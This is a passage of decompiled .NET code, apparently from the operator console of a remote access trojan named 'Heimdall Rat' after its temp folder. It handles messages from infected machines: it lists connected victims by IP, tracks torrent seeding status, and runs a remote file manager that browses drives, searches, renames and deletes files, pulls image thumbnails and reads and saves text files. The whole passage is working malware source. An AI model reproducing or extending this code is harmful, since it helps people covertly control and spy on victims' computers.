						val41.set_ForeColor(Color.Green);
						val41.get_SubItems().Add("uTorrent : " + array14[0] + " | BitTorrent : " + array14[1]);
						val41.set_ToolTipText(sock.ToString());
						val41.set_Tag((object)array[3]);
					}
					else if ((Operators.CompareString(array14[0], "False", false) == 0) & (Operators.CompareString(array14[1], "False", false) == 0))
					{
						val41 = tSDGR.Clients.get_Items().Add(SocketServer.Decode(array[1]) + " / " + s.IP(ref sock), 0);
						val41.set_ForeColor(Color.Red);
						val41.get_SubItems().Add("uTorrent : " + array14[0] + " | BitTorrent : " + array14[1]);
						val41.set_ToolTipText(sock.ToString());
						val41.set_Tag((object)array[3]);
					}
					else
					{
						val41 = tSDGR.Clients.get_Items().Add(SocketServer.Decode(array[1]) + " / " + s.IP(ref sock), 0);
						val41.set_ForeColor(Color.Orange);
						val41.get_SubItems().Add("uTorrent : " + array14[0] + " | BitTorrent : " + array14[1]);
						val41.set_ToolTipText(sock.ToString());
						val41.set_Tag((object)array[3]);
					}
					val41 = tSDGR.Clogs.get_Items().Add("[" + DateAndTime.get_Now().ToString() + "] - " + SocketServer.Decode(array[1]) + " : Connected");
					val41.set_ForeColor(Color.Green);
				}
				else if (Operators.CompareString(array[0], "Torrent Status", false) == 0)
				{
					TSDGR tSDGR2 = (TSDGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF");
					if (Operators.CompareString(array[1], "seeded successfully", false) == 0)
					{
						ListViewItem val42 = tSDGR2.Clogs.get_Items().Add("[" + DateAndTime.get_Now().ToString() + "] - " + SocketServer.Decode(array[2]) + " : " + array[3] + " " + array[1]);
						val42.set_ForeColor(Color.Green);
					}
					if (Operators.CompareString(array[1], "unseeded successfully", false) == 0)
					{
						ListViewItem val43 = tSDGR2.Clogs.get_Items().Add("[" + DateAndTime.get_Now().ToString() + "] - " + SocketServer.Decode(array[2]) + " : " + array[3] + " " + array[1]);
						val43.set_ForeColor(Color.Red);
					}
				}
				else if (Operators.CompareString(array[0], "OpenFileManager", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]) != null)
					{
						s.Send(Conversions.ToInteger(array[2]), "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data17 = this.data;
						((Control)this).Invoke((Delegate)data17, new object[2] { sock, b });
					}
					else
					{
						FMGR fMGR = new FMGR();
						fMGR.sock = sock;
						((Control)fMGR).set_Name("OpenFileManager" + array[2]);
						((Form)fMGR).set_Text("[ File Manager ] [ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						fMGR.Path = Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + "\\Downloads\\";
						((Control)fMGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "Result", false) == 0)
				{
					FMGR fMGR2 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					if (!((Control)fMGR2.LocatPath).get_Enabled())
					{
						((Control)fMGR2.LocatPath).set_Enabled(true);
					}
					if (Operators.CompareString(array[1], "Disks found", false) == 0)
					{
						((Control)fMGR2.quikacc).set_Enabled(true);
						((Control)fMGR2.pathEntr).set_Enabled(true);
						((Control)fMGR2.pathRefr).set_Enabled(true);
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Disks found");
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
					}
					else if (Operators.CompareString(array[1], "Could not get disks", false) == 0)
					{
						((Control)fMGR2.quikacc).set_Enabled(true);
						((Control)fMGR2.pathEntr).set_Enabled(true);
						((Control)fMGR2.pathRefr).set_Enabled(true);
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Could not get disks");
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
					}
					else if (Operators.CompareString(array[1], "Please wait a momment ...", false) == 0)
					{
						((Control)fMGR2.listFiles).set_Enabled(false);
						((Control)fMGR2.quikacc).set_Enabled(false);
						((Control)fMGR2.pathEntr).set_Enabled(false);
						((Control)fMGR2.pathRefr).set_Enabled(false);
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Please wait a moment ...");
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
					}
					else if (Operators.CompareString(array[1], "File list successfully created", false) == 0)
					{
						((Control)fMGR2.listFiles).set_Enabled(true);
						((Control)fMGR2.quikacc).set_Enabled(true);
						((Control)fMGR2.pathEntr).set_Enabled(true);
						((Control)fMGR2.pathRefr).set_Enabled(true);
						((Control)fMGR2.LocatPath).set_Enabled(true);
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("File list successfully created");
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
					}
					else if (Operators.CompareString(array[1], "ERR : ", false) == 0)
					{
						((Control)fMGR2.listFiles).set_Enabled(true);
						((Control)fMGR2.quikacc).set_Enabled(true);
						((Control)fMGR2.pathEntr).set_Enabled(true);
						((Control)fMGR2.pathRefr).set_Enabled(true);
						((Control)fMGR2.LocatPath).set_Enabled(true);
						((ToolStripItem)fMGR2.ToolStripStatusLabel3).set_Text("-");
						((ToolStripItem)fMGR2.ToolStripStatusLabel2).set_Text("-");
						if (SocketServer.Decode(array[2]).ToString().Contains("Access to the path"))
						{
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Error : Access Denied");
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.IndianRed);
						}
						else if (SocketServer.Decode(array[2]).ToString().Contains("NotFound"))
						{
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Error : Not Found");
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.IndianRed);
						}
						else if (SocketServer.Decode(array[2]).ToString().Contains("not ready"))
						{
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Error : The Device is not ready");
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.IndianRed);
						}
						else if (SocketServer.Decode(array[2]).ToString().Contains("System.NullReferenceException"))
						{
							if (fMGR2.listFiles.get_Items().get_Count() == 1)
							{
								((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Empty folder");
								((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.IndianRed);
							}
							else if (fMGR2.listFiles.get_Items().get_Count() > 1)
							{
								((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("File list successfully created");
								((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
							}
						}
						else
						{
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text("Could not get files or directorys");
							((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.IndianRed);
						}
					}
					else
					{
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_ForeColor(Color.FromArgb(150, 150, 150));
						((ToolStripItem)fMGR2.ToolStripStatusLabel1).set_Text(array[1] + SocketServer.Decode(array[2]));
					}
				}
				else if (Operators.CompareString(array[0], "RD", false) == 0)
				{
					FMGR fMGR3 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					((ToolStripItem)fMGR3.ToolStripStatusLabel1).set_Text(array[1] + SocketServer.Decode(array[2]));
					if (!array[1].Contains("successfully"))
					{
						return;
					}
					try
					{
						IEnumerator enumerator7 = default(IEnumerator);
						try
						{
							enumerator7 = fMGR3.listFiles.get_Items().GetEnumerator();
							while (enumerator7.MoveNext())
							{
								ListViewItem val44 = (ListViewItem)enumerator7.Current;
								if (Operators.CompareString(val44.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array[4]), false) == 0)
								{
									val44.Remove();
								}
							}
						}
						finally
						{
							if (enumerator7 is IDisposable)
							{
								(enumerator7 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError23)
					{
						ProjectData.SetProjectError(projectError23);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "ResultA", false) == 0)
				{
					FMGR fMGR4 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[5]);
					((ToolStripItem)fMGR4.ToolStripStatusLabel1).set_Text(array[1] + SocketServer.Decode(array[2]) + array[3] + SocketServer.Decode(array[4]));
					try
					{
						if (array[1].Contains("successfully"))
						{
						}
					}
					catch (Exception projectError24)
					{
						ProjectData.SetProjectError(projectError24);
						ProjectData.ClearProjectError();
					}
					try
					{
						IEnumerator enumerator8 = default(IEnumerator);
						try
						{
							enumerator8 = fMGR4.listFiles.get_Items().GetEnumerator();
							while (enumerator8.MoveNext())
							{
								ListViewItem val45 = (ListViewItem)enumerator8.Current;
								if (Operators.CompareString(val45.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array[6]).ToString(), false) == 0)
								{
									val45.get_SubItems().get_Item(0).set_Text(SocketServer.Decode(array[4]).ToString());
								}
							}
						}
						finally
						{
							if (enumerator8 is IDisposable)
							{
								(enumerator8 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError25)
					{
						ProjectData.SetProjectError(projectError25);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Drivers", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data18 = this.data;
						((Control)this).Invoke((Delegate)data18, new object[2] { sock, b });
					}
					else
					{
						FMGR fMGR5 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
						string[] array15 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), " | ", -1, (CompareMethod)0);
						int num32 = 0;
						try
						{
							try
							{
								IEnumerator enumerator9 = default(IEnumerator);
								try
								{
									enumerator9 = fMGR5.quikacc.get_Nodes().GetEnumerator();
									while (enumerator9.MoveNext())
									{
										TreeNode val46 = (TreeNode)enumerator9.Current;
										if (Operators.CompareString(val46.get_Text(), "My Computer", false) != 0)
										{
											continue;
										}
										int num33 = array15.Length - 2;
										int num34 = 0;
										while (true)
										{
											int num35 = num34;
											int num5 = num33;
											if (num35 <= num5)
											{
												if ((num34 > array15.Length - 2 || ((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]) == null) ? true : false)
												{
													break;
												}
												if ((array15[num34].Length != 0) | (array15[num34 + 1].Length == 0) | (array15[num34 + 2].Length == 0))
												{
													try
													{
														if (array15[num34 + 1].Contains("System"))
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 9, 9)
																.set_ToolTipText(array15[num34 + 2]);
															fMGR5.SearchPath.set_Text(array15[num34]);
														}
														else if (array15[num34 + 2].Contains("[Fixed]"))
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 10, 10)
																.set_ToolTipText(array15[num34 + 2]);
														}
														else if (array15[num34 + 2].Contains("[CDRom]"))
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 11, 11)
																.set_ToolTipText(array15[num34 + 2]);
														}
														else if (array15[num34 + 2].Contains("[Removable]"))
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 14, 14)
																.set_ToolTipText(array15[num34 + 2]);
														}
														else if (array15[num34 + 2].Contains("[Network]"))
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 12, 12)
																.set_ToolTipText(array15[num34 + 2]);
														}
														else
														{
															fMGR5.quikacc.get_Nodes().get_Item(val46.get_Index()).get_Nodes()
																.Add(array15[num34], array15[num34], 13, 13)
																.set_ToolTipText(array15[num34 + 2]);
														}
														num32++;
													}
													catch (Exception projectError26)
													{
														ProjectData.SetProjectError(projectError26);
														ProjectData.ClearProjectError();
													}
													num34 += 2;
												}
												num34++;
												num34 += 0;
												continue;
											}
											fMGR5.quikacc.get_Nodes().get_Item(1).ExpandAll();
											goto IL_728c;
										}
										break;
										IL_728c:;
									}
								}
								finally
								{
									if (enumerator9 is IDisposable)
									{
										(enumerator9 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError28)
						{
							ProjectData.SetProjectError(projectError28);
							ProjectData.ClearProjectError();
						}
						((ToolStripItem)fMGR5.ToolStripStatusLabel4).set_Text("Drives : " + num32 + " -");
					}
				}
				else if (Operators.CompareString(array[0], "Files", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data19 = this.data;
						((Control)this).Invoke((Delegate)data19, new object[2] { sock, b });
						return;
					}
					FMGR fMGR6 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					string text = Conversions.ToString(STRCOMP.Decode(array[1]));
					string[] array16 = Strings.Split(text, "*Files*", -1, (CompareMethod)0);
					if (text.Contains(".tiff") | text.Contains(".jpg") | text.Contains(".png") | text.Contains(".jpeg") | text.Contains(".bmp") | text.Contains(".gif"))
					{
						fMGR6.ThumbnailsToolStripMenuItem.set_Enabled(true);
					}
					else
					{
						fMGR6.ThumbnailsToolStripMenuItem.set_Enabled(false);
					}
					try
					{
						if (!Directory.Exists(Interaction.Environ("Temp") + "\\Heimdall.Rat\\"))
						{
							Directory.CreateDirectory(Interaction.Environ("Temp") + "\\Heimdall.Rat\\");
						}
					}
					catch (Exception projectError29)
					{
						ProjectData.SetProjectError(projectError29);
						ProjectData.ClearProjectError();
					}
					int num36 = 0;
					int num37 = array16.Length - 2;
					num36 = 0;
					while (true)
					{
						int num38 = num36;
						int num5 = num37;
						if (num38 > num5)
						{
							break;
						}
						try
						{
							if (!fMGR6.ImageList3.get_Images().ContainsKey(array16[num36 + 2]))
							{
								if (!File.Exists(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + ".ico"))
								{
									File.Create(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + " File." + array16[num36 + 2]).Close();
									Icon val47 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + " File." + array16[num36 + 2]);
									MultiIcon val48 = new MultiIcon();
									SingleIcon val49 = val48.Add(array16[num36 + 2]);
									val49.CreateFrom(val47.ToBitmap(), (IconOutputFormat)1);
									val49.Save(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + ".ico");
									fMGR6.ImageList3.get_Images().Add(array16[num36 + 2], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + ".ico"));
								}
								else
								{
									fMGR6.ImageList3.get_Images().Add(array16[num36 + 2], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array16[num36 + 2] + ".ico"));
								}
							}
							object obj = ((Operators.CompareString(array16[num36 + 2], (string)null, false) != 0) ? fMGR6.listFiles.get_Items().Add(array16[num36 + 2], array16[num36], array16[num36 + 2]) : fMGR6.listFiles.get_Items().Add(array16[num36], 1));
							object obj2 = NewLateBinding.LateGet(obj, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array17 = new object[1];
							object[] array18 = array17;
							string[] array19 = array16;
							string[] array20 = array19;
							int num39 = num36 + 1;
							array18[0] = array20[num39];
							object[] array21 = array17;
							object[] array22 = array21;
							bool[] array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj2, (Type)null, "Add", array22, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
							}
							NewLateBinding.LateCall(NewLateBinding.LateGet(obj, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { array16[num36 + 2] + " File" }, (string[])null, (Type[])null, (bool[])null, true);
							object obj3 = NewLateBinding.LateGet(obj, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array24 = array21;
							array19 = array16;
							string[] array25 = array19;
							num39 = num36 + 3;
							array24[0] = array25[num39];
							array17 = array21;
							object[] array26 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj3, (Type)null, "Add", array26, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							object obj4 = NewLateBinding.LateGet(obj, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array27 = array21;
							array19 = array16;
							string[] array28 = array19;
							num39 = num36 + 4;
							array27[0] = array28[num39];
							array17 = array21;
							object[] array29 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj4, (Type)null, "Add", array29, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							object obj5 = NewLateBinding.LateGet(obj, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array30 = array21;
							array19 = array16;
							string[] array31 = array19;
							num39 = num36 + 5;
							array30[0] = array31[num39];
							array17 = array21;
							object[] array32 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj5, (Type)null, "Add", array32, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							num36 += 5;
						}
						catch (Exception projectError30)
						{
							ProjectData.SetProjectError(projectError30);
							ListViewItem val50 = fMGR6.listFiles.get_Items().Add(array16[num36], 1);
							val50.get_SubItems().Add(array16[num36 + 1]);
							val50.get_SubItems().Add(array16[num36 + 2] + " File");
							val50.get_SubItems().Add(array16[num36 + 3]);
							val50.get_SubItems().Add(array16[num36 + 4]);
							val50.get_SubItems().Add(array16[num36 + 5]);
							val50.set_Tag((object)array16[num36 + 2]);
							num36 += 5;
							ProjectData.ClearProjectError();
						}
						num36++;
						num36 += 0;
					}
					try
					{
						fMGR6.listFiles.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError31)
					{
						ProjectData.SetProjectError(projectError31);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Directory", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data20 = this.data;
						((Control)this).Invoke((Delegate)data20, new object[2] { sock, b });
						return;
					}
					FMGR fMGR7 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					string[] array33 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "*DIRS*", -1, (CompareMethod)0);
					int num40 = 0;
					try
					{
						int num41 = array33.Length - 2;
						num40 = 0;
						while (true)
						{
							int num42 = num40;
							int num5 = num41;
							if (num42 <= num5 && ((num40 <= array33.Length - 2 && ((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]) != null && Operators.CompareString(SocketServer.Decode(array[3]), fMGR7.LocatPath.get_Text(), false) == 0) || 1 == 0))
							{
								ListViewItem val51 = fMGR7.listFiles.get_Items().Add(array33[num40], 0);
								val51.get_SubItems().Add("File Folder");
								val51.get_SubItems().Add("Directory");
								val51.get_SubItems().Add(array33[num40 + 1]);
								val51.get_SubItems().Add(array33[num40 + 2]);
								val51.get_SubItems().Add(array33[num40 + 3]);
								val51.get_SubItems().Add(array33[num40 + 4]);
								num40 += 3;
								num40++;
								num40 += 0;
								continue;
							}
							break;
						}
					}
					catch (Exception projectError32)
					{
						ProjectData.SetProjectError(projectError32);
						ProjectData.ClearProjectError();
					}
					try
					{
						fMGR7.listFiles.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError33)
					{
						ProjectData.SetProjectError(projectError33);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Counters", false) == 0)
				{
					FMGR fMGR8 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					if (Operators.CompareString(SocketServer.Decode(array[4]), fMGR8.LocatPath.get_Text(), false) != 0)
					{
						return;
					}
					try
					{
						((ToolStripItem)fMGR8.ToolStripStatusLabel3).set_Text("Files : " + array[1]);
						((ToolStripItem)fMGR8.ToolStripStatusLabel2).set_Text("- Directories : " + array[2] + " -");
					}
					catch (Exception projectError34)
					{
						ProjectData.SetProjectError(projectError34);
						((ToolStripItem)fMGR8.ToolStripStatusLabel3).set_Text("Files : ????");
						((ToolStripItem)fMGR8.ToolStripStatusLabel2).set_Text("- Directories : ???? -");
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "GetSelectedPath", false) == 0)
				{
					FMGR fMGR9 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					fMGR9.LocatPath.set_Text(SocketServer.Decode(array[1]));
					fMGR9.listFiles.get_Items().Clear();
					if (fMGR9.LocatPath.get_Text().Length > 3)
					{
						fMGR9.listFiles.get_Items().Add("...", 0);
						fMGR9.BackToolStripMenuItem.set_Enabled(true);
					}
					else
					{
						fMGR9.BackToolStripMenuItem.set_Enabled(false);
					}
					((Control)fMGR9.quikacc).set_Enabled(false);
					s.Send(sock, "GetFiles-Directorys" + Key + SocketServer.Encode(fMGR9.LocatPath.get_Text()));
				}
				else if (Operators.CompareString(array[0], "viewimage", false) == 0)
				{
					try
					{
						FMGR fMGR10 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
						fMGR10.ImageList4.get_Images().Add(SocketServer.Decode(array[3]), (Image)new Bitmap(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array[1])))));
						ListViewItem val52 = fMGR10.listThumb.get_Items().Add(SocketServer.Decode(array[3]), SocketServer.Decode(array[3]), SocketServer.Decode(array[3]));
						val52.set_Tag((object)("Thumbnail Name : " + SocketServer.Decode(array[3]) + "\r\n\r\nThumbnail Path : " + SocketServer.Decode(array[4]) + "\r\n\r\nThumbnail Size : " + SocketServer.GetSize(ulong.Parse(array[5]))));
					}
					catch (Exception projectError35)
					{
						ProjectData.SetProjectError(projectError35);
						ProjectData.ClearProjectError();
					}
					ThumbGR thumbGR = (ThumbGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TH" + array[2]);
					try
					{
						if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TH" + array[2]) != null)
						{
							((Form)thumbGR).set_Text(SocketServer.Decode(array[3]));
							thumbGR.PictureBox1.set_Image((Image)new Bitmap(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array[1])))));
						}
						else
						{
							((Form)thumbGR).Close();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
					try
					{
						FMGR fMGR11 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
						((ToolStripItem)fMGR11.ToolStripStatusLabel6).set_Text("Total items ( 0 )".Replace("0", fMGR11.listThumb.get_Items().get_Count().ToString()));
					}
					catch (Exception projectError37)
					{
						ProjectData.SetProjectError(projectError37);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "Search", false) == 0)
				{
					FMGR fMGR12 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					((Control)fMGR12.StartSearc).set_Enabled(true);
					((Control)fMGR12.SearchPath).set_Enabled(true);
					((Control)fMGR12.SearcFileName).set_Enabled(true);
					((Control)fMGR12.listSearchFiles).set_Enabled(true);
					((ToolStripItem)fMGR12.ToolStripStatusLabel5).set_Text("Search files list successfully created");
					((ToolStripItem)fMGR12.ToolStripStatusLabel8).set_Text(fMGR12.listSearchFiles.get_Items().get_Count() + " Files Found -");
				}
				else if (Operators.CompareString(array[0], "SDIR", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data21 = this.data;
						((Control)this).Invoke((Delegate)data21, new object[2] { sock, b });
						return;
					}
					FMGR fMGR13 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					string[] array34 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "DPFM", -1, (CompareMethod)0);
					int num43 = 0;
					int num44 = array34.Length - 2;
					num43 = 0;
					while (true)
					{
						int num45 = num43;
						int num5 = num44;
						if (num45 > num5)
						{
							break;
						}
						fMGR13.listSearchFiles.get_Items().Add(array34[num43], 0).get_SubItems()
							.Add("Null");
						num43++;
						num43 += 0;
					}
					try
					{
						fMGR13.listSearchFiles.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError38)
					{
						ProjectData.SetProjectError(projectError38);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "SFIL", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data22 = this.data;
						((Control)this).Invoke((Delegate)data22, new object[2] { sock, b });
						return;
					}
					FMGR fMGR14 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[2]);
					string[] array35 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|*|", -1, (CompareMethod)0);
					if (!Directory.Exists(Interaction.Environ("Temp") + "\\HeimdallRat\\"))
					{
						Directory.CreateDirectory(Interaction.Environ("Temp") + "\\HeimdallRat\\");
					}
					int num46 = 0;
					int num47 = array35.Length - 2;
					num46 = 0;
					while (true)
					{
						int num48 = num46;
						int num5 = num47;
						if (num48 > num5)
						{
							break;
						}
						if (Operators.CompareString(array35[num46 + 2], (string)null, false) == 0)
						{
							fMGR14.listSearchFiles.get_Items().Add(array35[num46], 1).get_SubItems()
								.Add(array35[num46 + 1]);
						}
						else
						{
							if (!File.Exists(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + ".ico"))
							{
								try
								{
									File.Create(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + " File." + array35[num46 + 2]).Close();
									Icon val53 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + " File." + array35[num46 + 2]);
									MultiIcon val54 = new MultiIcon();
									SingleIcon val55 = val54.Add(array35[num46 + 2]);
									val55.CreateFrom(val53.ToBitmap(), (IconOutputFormat)1);
									val55.Save(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + ".ico");
									fMGR14.ImageList4.get_Images().Add(array35[num46 + 2], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + ".ico"));
								}
								catch (Exception projectError39)
								{
									ProjectData.SetProjectError(projectError39);
									fMGR14.ImageList3.get_Images().Add(array35[num46 + 2], (Image)new Bitmap(fMGR14.ImageList1.get_Images().get_Item(1)));
									ProjectData.ClearProjectError();
								}
							}
							else
							{
								fMGR14.ImageList3.get_Images().Add(array35[num46 + 2], (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + array35[num46 + 2] + ".ico"));
							}
							ListViewItem val56 = fMGR14.listSearchFiles.get_Items().Add(array35[num46 + 2], array35[num46], array35[num46 + 2]);
							val56.get_SubItems().Add(array35[num46 + 1]);
						}
						num46 += 2;
						num46++;
						num46 += 0;
					}
					try
					{
						fMGR14.listSearchFiles.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError40)
					{
						ProjectData.SetProjectError(projectError40);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "ReadAllText", false) == 0)
				{
					FMGR fMGR15 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					fMGR15.reTextPath.set_Text(SocketServer.Decode(array[2]));
					fMGR15.txtbRat.set_Text(SocketServer.Decode(array[1]));
					((ToolStripItem)fMGR15.ToolStripStatusLabel7).set_Text(SocketServer.Decode(array[2]) + " - Loaded Successfully");
					((Control)fMGR15.reTextPath).set_Enabled(true);
					((Control)fMGR15.readGo).set_Enabled(true);
					((Control)fMGR15.txtbRat).set_Enabled(true);
					((Control)fMGR15.redSave).set_Enabled(true);
				}
				else if (Operators.CompareString(array[0], "ResultText", false) == 0)
				{
					FMGR fMGR16 = (FMGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + array[3]);
					((Control)fMGR16.reTextPath).set_Enabled(true);
					((Control)fMGR16.readGo).set_Enabled(true);
					((Control)fMGR16.redSave).set_Enabled(true);
					((Control)fMGR16.txtbRat).set_Enabled(true);
					((ToolStripItem)fMGR16.ToolStripStatusLabel7).set_Text(SocketServer.Decode(array[1]) + array[2]);
				}
